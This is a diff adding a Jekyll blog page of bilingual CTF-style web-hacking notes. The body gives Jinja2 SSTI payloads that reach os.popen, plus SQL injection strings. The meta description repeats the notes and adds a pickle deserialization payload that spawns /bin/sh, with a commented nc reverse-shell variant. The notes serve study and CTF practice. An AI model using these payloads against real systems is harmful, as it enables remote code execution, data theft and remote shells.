@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      web note (update 2021.10.27)
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="web note (update 2021.10.27)" />
+<meta name="author" content="Ainsetin" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="post will be frequently updated SSTI (Server Side Template Injection) 해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 RCE를 일으킬 수도 있다. This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax. ▶ jinja2 # 기본 {{ 4*4 }} =&gt; 16 # check with config {{ config }} {{ config.items() }} {{ config[&#39;secret_key&#39;] }} # RCE with config {{ config.__class__.__init__.__globals__[&#39;os&#39;].popen(&quot;ls&quot;).read() }} {{ (config|attr(&quot;__class__&quot;)).__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag&#39;).read() }} # etc (&#39;&#39;,(),get_flashed_messages, url_for, ...) {{ &#39;&#39;.__class__.__mro__[1].__subclasses__()[**index**](&#39;cat flag&#39;, shell=True, stdout=-1).communicate() }} {{ get_flashed_messages.__globals__.__builtins__.open(&quot;/flag&quot;).read() }} {{ url_for.__globals__.__builtins__.eval(&#39;__import__(&quot;os&quot;).popen(&quot;ls -al&quot;).read()&#39;) }} # with request - 필터링이 매우 많을 경우 more query + request를 활용하여 우회 http://foo.bar/?payload={{ request|attr(&#39;class&#39;)|attr(request.args.get(&#39;mro&#39;))|attr(request.args.get(&#39;getitem&#39;))(1) }}&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__ {{request|attr(&#39;application&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__import__&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()}} SQLI (sql injection) 해당 취약점은 DB를 관리하는 응용 프로그램에서 SQL 쿼리를 전달할 때 의도하지 않은 구문을 전달할 수 있도록 변조시키는 데 목적이 있다. The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries. 1. Comment symbol /* ~ */, -- ~, # (URL encoded : %23) -- example. Select * from tbl where id=&#39;(user_input)&#39; -- Select ALL query from tbl user_input=&quot;&#39; or 1=1-- &quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=1--&#39; user_input=&quot;&#39; or 1=1#&quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=1# user_input=&quot;&#39; or 1=1/*1234*/&quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=1/*1234*/&#39; ...? (must have closed symbol) 2. with single quarter id가 &#39;&#39;로 감싸져 있을 경우 &#39;를 input으로 넣어 먼저 닫아주게끔 한 뒤 조건문을 이어준다. -- example. Select * from tbl where id=&#39;(user_input)&#39; -- Select ALL query from tbl user_input=&quot;&#39; or 1=&#39;1&quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=&#39;1&#39; 3. and, or, &amp;&amp;, ||, in, between, like -- and, or Select * from tbl where id=&#39;1234&#39; and pw=&#39;5678&#39; Select * from tbl where id=&#39;1234&#39; or pw=&#39;5678&#39; -- &amp;&amp;, || (no space required) Select * from tbl where id=&#39;1234&#39;&amp;&amp;pw=&#39;5678&#39; Select * from tbl where id=&#39;1234&#39;||pw=&#39;5678&#39; -- in Select * from tbl where id in &#39;1234&#39; and pw in &#39;5678&#39; -- between and (both number and char are possible) Select * from tbl where age between 20 and 30 -- 20&lt;=age&lt;=30 Select * from tbl where score between &#39;A&#39; and &#39;C&#39; -- &#39;A&#39;&lt;=score&lt;=&#39;C&#39; --like (starts with ~, ends with ~, include ~, length) Select * from tbl where name like &#39;Bae%&#39; -- starts with Bae Select * from tbl where name like &#39;%uk&#39; -- ends with uk Select * from tbl where name like &#39;%won%&#39; -- include won Select * from tbl where name like &#39;___&#39; -- length 3 chars Select * from tbl where binary name like &#39;~&#39; -- distinguish upper/lower 4. Internal function in mysql char(...) : change integer arguments to char (ex. char(0x61,0x62,0x63)=&gt;&quot;abc&quot;) mid/substr[ing](a,b,c) : get c bytes in a from b(starts from 1 ~ ..) left(a,b) / right(a,b) : get b bytes in a (begin / end(reverse but print correctly)) version() : get mysql version database() : get current database python pickle deserialization pickle로 직렬화된 객체가 변조되어 역직렬화하는 과정에서 시스템에 접근하거나 의도치 않은 것이 실행되기도 한다. 원하는 class를 선언한 뒤, __reduce__를 통하여 pickle.loadunpickle 시 tuple을 반환하여 함수를 실행시킬 수 있다. import os import pickle class payload(object): def __reduce__(self): #return (os.system, (&#39;ls&#39;, )) #return (os.system, (&#39;cat flag&#39;, )) return (os.system, (&#39;/bin/sh&#39;, )) #return (os.system, (&#39;/bin/sh | nc [ip] [port]&#39;, )) pickle_d=pickle.dumps(payload()) pickle.loads(pickle_d) # get shell anyway $ id uid=1000(test) gid=1000(test) groups=1000(test) update 예정." />
+<meta property="og:description" content="post will be frequently updated SSTI (Server Side Template Injection) 해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 RCE를 일으킬 수도 있다. This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax. ▶ jinja2 # 기본 {{ 4*4 }} =&gt; 16 # check with config {{ config }} {{ config.items() }} {{ config[&#39;secret_key&#39;] }} # RCE with config {{ config.__class__.__init__.__globals__[&#39;os&#39;].popen(&quot;ls&quot;).read() }} {{ (config|attr(&quot;__class__&quot;)).__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag&#39;).read() }} # etc (&#39;&#39;,(),get_flashed_messages, url_for, ...) {{ &#39;&#39;.__class__.__mro__[1].__subclasses__()[**index**](&#39;cat flag&#39;, shell=True, stdout=-1).communicate() }} {{ get_flashed_messages.__globals__.__builtins__.open(&quot;/flag&quot;).read() }} {{ url_for.__globals__.__builtins__.eval(&#39;__import__(&quot;os&quot;).popen(&quot;ls -al&quot;).read()&#39;) }} # with request - 필터링이 매우 많을 경우 more query + request를 활용하여 우회 http://foo.bar/?payload={{ request|attr(&#39;class&#39;)|attr(request.args.get(&#39;mro&#39;))|attr(request.args.get(&#39;getitem&#39;))(1) }}&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__ {{request|attr(&#39;application&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__import__&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()}} SQLI (sql injection) 해당 취약점은 DB를 관리하는 응용 프로그램에서 SQL 쿼리를 전달할 때 의도하지 않은 구문을 전달할 수 있도록 변조시키는 데 목적이 있다. The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries. 1. Comment symbol /* ~ */, -- ~, # (URL encoded : %23) -- example. Select * from tbl where id=&#39;(user_input)&#39; -- Select ALL query from tbl user_input=&quot;&#39; or 1=1-- &quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=1--&#39; user_input=&quot;&#39; or 1=1#&quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=1# user_input=&quot;&#39; or 1=1/*1234*/&quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=1/*1234*/&#39; ...? (must have closed symbol) 2. with single quarter id가 &#39;&#39;로 감싸져 있을 경우 &#39;를 input으로 넣어 먼저 닫아주게끔 한 뒤 조건문을 이어준다. -- example. Select * from tbl where id=&#39;(user_input)&#39; -- Select ALL query from tbl user_input=&quot;&#39; or 1=&#39;1&quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=&#39;1&#39; 3. and, or, &amp;&amp;, ||, in, between, like -- and, or Select * from tbl where id=&#39;1234&#39; and pw=&#39;5678&#39; Select * from tbl where id=&#39;1234&#39; or pw=&#39;5678&#39; -- &amp;&amp;, || (no space required) Select * from tbl where id=&#39;1234&#39;&amp;&amp;pw=&#39;5678&#39; Select * from tbl where id=&#39;1234&#39;||pw=&#39;5678&#39; -- in Select * from tbl where id in &#39;1234&#39; and pw in &#39;5678&#39; -- between and (both number and char are possible) Select * from tbl where age between 20 and 30 -- 20&lt;=age&lt;=30 Select * from tbl where score between &#39;A&#39; and &#39;C&#39; -- &#39;A&#39;&lt;=score&lt;=&#39;C&#39; --like (starts with ~, ends with ~, include ~, length) Select * from tbl where name like &#39;Bae%&#39; -- starts with Bae Select * from tbl where name like &#39;%uk&#39; -- ends with uk Select * from tbl where name like &#39;%won%&#39; -- include won Select * from tbl where name like &#39;___&#39; -- length 3 chars Select * from tbl where binary name like &#39;~&#39; -- distinguish upper/lower 4. Internal function in mysql char(...) : change integer arguments to char (ex. char(0x61,0x62,0x63)=&gt;&quot;abc&quot;) mid/substr[ing](a,b,c) : get c bytes in a from b(starts from 1 ~ ..) left(a,b) / right(a,b) : get b bytes in a (begin / end(reverse but print correctly)) version() : get mysql version database() : get current database python pickle deserialization pickle로 직렬화된 객체가 변조되어 역직렬화하는 과정에서 시스템에 접근하거나 의도치 않은 것이 실행되기도 한다. 원하는 class를 선언한 뒤, __reduce__를 통하여 pickle.loadunpickle 시 tuple을 반환하여 함수를 실행시킬 수 있다. import os import pickle class payload(object): def __reduce__(self): #return (os.system, (&#39;ls&#39;, )) #return (os.system, (&#39;cat flag&#39;, )) return (os.system, (&#39;/bin/sh&#39;, )) #return (os.system, (&#39;/bin/sh | nc [ip] [port]&#39;, )) pickle_d=pickle.dumps(payload()) pickle.loads(pickle_d) # get shell anyway $ id uid=1000(test) gid=1000(test) groups=1000(test) update 예정." />
+<link rel="canonical" href="https://ainset.in//web-note-update.html" />
+<meta property="og:url" content="https://ainset.in//web-note-update.html" />
+<meta property="og:site_name" content="Ainsetin 🇰🇷 ⚡" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=https://ainset.in//web-note-update.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-10-27T10:00:00+09:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=https://ainset.in//web-note-update.html" />
+<meta property="twitter:title" content="web note (update 2021.10.27)" />
+<meta name="twitter:site" content="@ainsetin" />
+<meta name="twitter:creator" content="@Ainsetin" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"https://ainset.in//web-note-update.html","headline":"web note (update 2021.10.27)","dateModified":"2021-10-27T10:00:00+09:00","datePublished":"2021-10-27T10:00:00+09:00","author":{"@type":"Person","name":"Ainsetin"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://ainset.in//web-note-update.html"},"description":"post will be frequently updated SSTI (Server Side Template Injection) 해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 RCE를 일으킬 수도 있다. This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax. ▶ jinja2 # 기본 {{ 4*4 }} =&gt; 16 # check with config {{ config }} {{ config.items() }} {{ config[&#39;secret_key&#39;] }} # RCE with config {{ config.__class__.__init__.__globals__[&#39;os&#39;].popen(&quot;ls&quot;).read() }} {{ (config|attr(&quot;__class__&quot;)).__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag&#39;).read() }} # etc (&#39;&#39;,(),get_flashed_messages, url_for, ...) {{ &#39;&#39;.__class__.__mro__[1].__subclasses__()[**index**](&#39;cat flag&#39;, shell=True, stdout=-1).communicate() }} {{ get_flashed_messages.__globals__.__builtins__.open(&quot;/flag&quot;).read() }} {{ url_for.__globals__.__builtins__.eval(&#39;__import__(&quot;os&quot;).popen(&quot;ls -al&quot;).read()&#39;) }} # with request - 필터링이 매우 많을 경우 more query + request를 활용하여 우회 http://foo.bar/?payload={{ request|attr(&#39;class&#39;)|attr(request.args.get(&#39;mro&#39;))|attr(request.args.get(&#39;getitem&#39;))(1) }}&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__ {{request|attr(&#39;application&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__import__&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()}} SQLI (sql injection) 해당 취약점은 DB를 관리하는 응용 프로그램에서 SQL 쿼리를 전달할 때 의도하지 않은 구문을 전달할 수 있도록 변조시키는 데 목적이 있다. The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries. 1. Comment symbol /* ~ */, -- ~, # (URL encoded : %23) -- example. Select * from tbl where id=&#39;(user_input)&#39; -- Select ALL query from tbl user_input=&quot;&#39; or 1=1-- &quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=1--&#39; user_input=&quot;&#39; or 1=1#&quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=1# user_input=&quot;&#39; or 1=1/*1234*/&quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=1/*1234*/&#39; ...? (must have closed symbol) 2. with single quarter id가 &#39;&#39;로 감싸져 있을 경우 &#39;를 input으로 넣어 먼저 닫아주게끔 한 뒤 조건문을 이어준다. -- example. Select * from tbl where id=&#39;(user_input)&#39; -- Select ALL query from tbl user_input=&quot;&#39; or 1=&#39;1&quot; =&gt; Select * from tbl where id=&#39;&#39; or 1=&#39;1&#39; 3. and, or, &amp;&amp;, ||, in, between, like -- and, or Select * from tbl where id=&#39;1234&#39; and pw=&#39;5678&#39; Select * from tbl where id=&#39;1234&#39; or pw=&#39;5678&#39; -- &amp;&amp;, || (no space required) Select * from tbl where id=&#39;1234&#39;&amp;&amp;pw=&#39;5678&#39; Select * from tbl where id=&#39;1234&#39;||pw=&#39;5678&#39; -- in Select * from tbl where id in &#39;1234&#39; and pw in &#39;5678&#39; -- between and (both number and char are possible) Select * from tbl where age between 20 and 30 -- 20&lt;=age&lt;=30 Select * from tbl where score between &#39;A&#39; and &#39;C&#39; -- &#39;A&#39;&lt;=score&lt;=&#39;C&#39; --like (starts with ~, ends with ~, include ~, length) Select * from tbl where name like &#39;Bae%&#39; -- starts with Bae Select * from tbl where name like &#39;%uk&#39; -- ends with uk Select * from tbl where name like &#39;%won%&#39; -- include won Select * from tbl where name like &#39;___&#39; -- length 3 chars Select * from tbl where binary name like &#39;~&#39; -- distinguish upper/lower 4. Internal function in mysql char(...) : change integer arguments to char (ex. char(0x61,0x62,0x63)=&gt;&quot;abc&quot;) mid/substr[ing](a,b,c) : get c bytes in a from b(starts from 1 ~ ..) left(a,b) / right(a,b) : get b bytes in a (begin / end(reverse but print correctly)) version() : get mysql version database() : get current database python pickle deserialization pickle로 직렬화된 객체가 변조되어 역직렬화하는 과정에서 시스템에 접근하거나 의도치 않은 것이 실행되기도 한다. 원하는 class를 선언한 뒤, __reduce__를 통하여 pickle.loadunpickle 시 tuple을 반환하여 함수를 실행시킬 수 있다. import os import pickle class payload(object): def __reduce__(self): #return (os.system, (&#39;ls&#39;, )) #return (os.system, (&#39;cat flag&#39;, )) return (os.system, (&#39;/bin/sh&#39;, )) #return (os.system, (&#39;/bin/sh | nc [ip] [port]&#39;, )) pickle_d=pickle.dumps(payload()) pickle.loads(pickle_d) # get shell anyway $ id uid=1000(test) gid=1000(test) groups=1000(test) update 예정.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+
+  <link type="application/atom+xml" rel="alternate" href="https://ainset.in//feed.xml" title="Ainsetin 🇰🇷 ⚡" />
+
+  <link rel="shortcut icon" href="https://ainset.in/favicon.ico" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">home..</a>
+<h1 class="post-title">web note (update 2021.10.27)</h1>
+<p class="post-date text-bold text-upcase">
+  
+    <span>October 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+
+<p><em>post will be frequently updated</em></p>
+
+<h3 id="ssti-server-side-template-injection">SSTI (Server Side Template Injection)</h3>
+<p>해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 <code class="language-plaintext highlighter-rouge">RCE</code>를 일으킬 수도 있다.<br />
+This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.</p>
+
+<p>▶ jinja2</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 기본
+</span><span class="p">{{</span> <span class="mi">4</span><span class="o">*</span><span class="mi">4</span> <span class="p">}}</span> <span class="o">=&gt;</span> <span class="mi">16</span>
+
+<span class="c1"># check with config
+</span><span class="p">{{</span> <span class="n">config</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="n">items</span><span class="p">()</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="n">config</span><span class="p">[</span><span class="s">'secret_key'</span><span class="p">]</span> <span class="p">}}</span>
+
+<span class="c1"># RCE with config
+</span><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s">'os'</span><span class="p">].</span><span class="n">popen</span><span class="p">(</span><span class="s">"ls"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="p">(</span><span class="n">config</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">"__class__"</span><span class="p">)).</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s">'os'</span><span class="p">].</span><span class="n">popen</span><span class="p">(</span><span class="s">'cat flag'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+
+<span class="c1"># etc ('',(),get_flashed_messages, url_for, ...)
+</span><span class="p">{{</span> <span class="s">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="o">**</span><span class="n">index</span><span class="o">**</span><span class="p">](</span><span class="s">'cat flag'</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">).</span><span class="n">communicate</span><span class="p">()</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="n">get_flashed_messages</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="n">url_for</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="s">'__import__("os").popen("ls -al").read()'</span><span class="p">)</span> <span class="p">}}</span>
+</code></pre></div></div>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># with request - 필터링이 매우 많을 경우 more query + request를 활용하여 우회
+</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">foo</span><span class="p">.</span><span class="n">bar</span><span class="o">/</span><span class="err">?</span><span class="n">payload</span><span class="o">=</span><span class="p">{{</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'class'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'mro'</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'getitem'</span><span class="p">))(</span><span class="mi">1</span><span class="p">)</span> <span class="p">}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="n">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="n">__mro__</span><span class="o">&amp;</span><span class="n">getitem</span><span class="o">=</span><span class="n">__getitem__</span>
+<span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'application'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'__globals__'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'__getitem__'</span><span class="p">)(</span><span class="s">'__builtins__'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'__getitem__'</span><span class="p">)(</span><span class="s">'__import__'</span><span class="p">)(</span><span class="s">'os'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'popen'</span><span class="p">)(</span><span class="s">'id'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'read'</span><span class="p">)()}}</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h3 id="sqli-sql-injection">SQLI (sql injection)</h3>
+<p>해당 취약점은 DB를 관리하는 응용 프로그램에서 SQL 쿼리를 전달할 때 의도하지 않은 구문을 전달할 수 있도록 변조시키는 데 목적이 있다.<br />
+The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.</p>
+
+<p><strong>1. Comment symbol</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/* ~ */</code>, <code class="language-plaintext highlighter-rouge">-- ~</code>, <code class="language-plaintext highlighter-rouge">#</code> (URL encoded : <code class="language-plaintext highlighter-rouge">%23</code>)</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>
+
+<span class="c1">-- Select ALL query from tbl</span>
+<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1-- "</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--'</span>
+<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1#"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
+<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1/*1234*/"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="cm">/*1234*/</span><span class="s1">' ...?
+(must have closed symbol)
+</span></code></pre></div></div>
+
+<p><strong>2. with single quarter</strong></p>
+<ul>
+  <li>id가 <code class="language-plaintext highlighter-rouge">''</code>로 감싸져 있을 경우 <code class="language-plaintext highlighter-rouge">'</code>를 input으로 넣어 먼저 닫아주게끔 한 뒤 조건문을 이어준다.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>
+
+<span class="c1">-- Select ALL query from tbl</span>
+<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1='1"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="s1">'1'</span>
+</code></pre></div></div>
+
+<p><strong>3. and, or, &amp;&amp;, ||, in, between, like</strong></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- and, or</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">or</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
+
+<span class="c1">-- &amp;&amp;, || (no space required)</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">&amp;&amp;</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">||</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
+
+<span class="c1">-- in</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span> <span class="k">in</span> <span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span> <span class="k">in</span> <span class="s1">'5678'</span>
+
+<span class="c1">-- between and (both number and char are possible)</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">age</span> <span class="k">between</span> <span class="mi">20</span> <span class="k">and</span> <span class="mi">30</span> <span class="c1">-- 20&lt;=age&lt;=30</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">score</span> <span class="k">between</span> <span class="s1">'A'</span> <span class="k">and</span> <span class="s1">'C'</span> <span class="c1">-- 'A'&lt;=score&lt;='C'</span>
+
+<span class="c1">--like (starts with ~, ends with ~, include ~, length)</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'Bae%'</span> <span class="c1">-- starts with Bae</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%uk'</span> <span class="c1">-- ends with uk</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%won%'</span> <span class="c1">-- include won</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'___'</span> <span class="c1">-- length 3 chars</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="nb">binary</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'~'</span> <span class="c1">-- distinguish upper/lower</span>
+</code></pre></div></div>
+
+<p><strong>4. Internal function in mysql</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">char(...)</code> : change integer arguments to char (ex. <code class="language-plaintext highlighter-rouge">char(0x61,0x62,0x63)</code>=&gt;<code class="language-plaintext highlighter-rouge">"abc"</code>)</li>
+  <li><code class="language-plaintext highlighter-rouge">mid/substr[ing](a,b,c)</code> : get <code class="language-plaintext highlighter-rouge">c</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> from <code class="language-plaintext highlighter-rouge">b(starts from 1 ~ ..)</code></li>
+  <li><code class="language-plaintext highlighter-rouge">left(a,b)</code> / <code class="language-plaintext highlighter-rouge">right(a,b)</code> : get <code class="language-plaintext highlighter-rouge">b</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> (begin / end(reverse but print correctly))</li>
